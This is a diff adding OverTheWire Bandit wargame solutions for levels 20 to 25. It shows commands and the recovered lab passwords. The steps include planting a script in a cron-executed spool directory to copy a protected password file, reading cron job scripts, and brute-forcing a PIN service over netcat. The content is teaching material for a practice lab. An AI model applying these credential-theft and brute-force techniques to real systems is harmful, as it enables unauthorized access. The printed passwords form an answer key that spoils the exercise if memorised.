@@ -352,6 +352,113 @@ VxCazJaVykI6W36BkBU0mJTCM8rR95XT
 <summary>Level 20 -> Level 21</summary>
 
 ```
+ls
+
+./suconnect
+
+echo "VxCazJaVykI6W36BkBU0mJTCM8rR95XT" | nc -l -p 30088 &
+
+./suconnect 30088
+
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+```
+
+</details>
+
+<details open>
+<summary>Level 21 -> Level 22</summary>
+
+```
+ls /etc/cron.d
+
+cat /etc/cron.d/cronjob_bandit22
+
+cat /usr/bin/cronjob_bandit22.sh
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+```
+
+</details>
+
+<details open>
+<summary>Level 22 -> Level 23</summary>
+
+```
+cd /etc/cron.d
+
+ls
+
+cat cronjob_bandit23
+
+cat /usr/bin/cronjob_bandit23.sh
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+```
+
+</details>
+
+<details open>
+<summary>Level 23 -> Level 24</summary>
+
+```
+cd /etc/cron.d
+
+ls
+
+cat cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh
+
+cd /tmp
+
+nano get_24pass.sh
+#!/bin/bash
+chmod +x ./get_24pass.sh
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24pass
+
+cd /var/spool/bandit24/foo
+
+cp /tmp/get_24pass.sh /var/spool/bandit24/foo
+
+chmod +x ./get_24pass.sh
+
+cat /tmp/bandit24pass
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+
+</details>
+
+<details open>
+<summary>Level 24 -> Level 25</summary>
+
+```
+for pin in {9000..9999}; do
+    echo $(cat /etc/bandit_pass/bandit24) $pin | tee -a ./bandit25pin
+done
+
+cat ./bandit25pin | nc localhost 30002 | tee ./bandit25pass
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
+
+</details>
+
+<details open>
+<summary>Level 25 -> Level 26</summary>
+
+```
 
 ```
 
